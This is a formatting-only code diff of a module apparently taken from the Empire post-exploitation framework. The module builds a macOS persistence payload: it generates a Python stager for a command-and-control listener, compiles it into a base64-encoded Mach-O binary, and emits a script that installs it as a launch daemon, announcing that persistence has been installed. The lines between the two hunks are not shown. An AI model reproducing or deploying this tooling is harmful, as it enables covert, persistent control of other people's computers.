@@ -1,21 +1,32 @@
 import base64
-from typing import Dict, Tuple, Optional
+from typing import Dict, Optional, Tuple
 
 from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ) -> Tuple[Optional[str], Optional[str]]:
 
-        daemon_name = params['DaemonName']
-        program_name = daemon_name.split('.')[-1]
+        daemon_name = params["DaemonName"]
+        program_name = daemon_name.split(".")[-1]
         plist_filename = "%s.plist" % daemon_name
-        listener_name = params['Listener']
-        user_agent = params['UserAgent']
-        safe_checks = params['SafeChecks']
-        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
-        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
+        listener_name = params["Listener"]
+        user_agent = params["UserAgent"]
+        safe_checks = params["SafeChecks"]
+        launcher = main_menu.stagers.generate_launcher(
+            listener_name,
+            language="python",
+            userAgent=user_agent,
+            safeChecks=safe_checks,
+        )
+        launcher = launcher.strip("echo").strip(" | python3 &").strip('"')
         macho_bytes = main_menu.stagers.generate_macho(launcherCode=launcher)
         enc_bytes = base64.b64encode(macho_bytes)
 
@@ -78,7 +89,12 @@ process.communicate()
 print("\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s")
 print("\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s")
 
-""" % {"encBytes":enc_bytes, "plistSettings":plistSettings, "daemonName":daemon_name, "programName":program_name, "plistFilename":plist_filename}
+""" % {
+            "encBytes": enc_bytes,
+            "plistSettings": plistSettings,
+            "daemonName": daemon_name,
+            "programName": program_name,
+            "plistFilename": plist_filename,
+        }
 
         return script
-
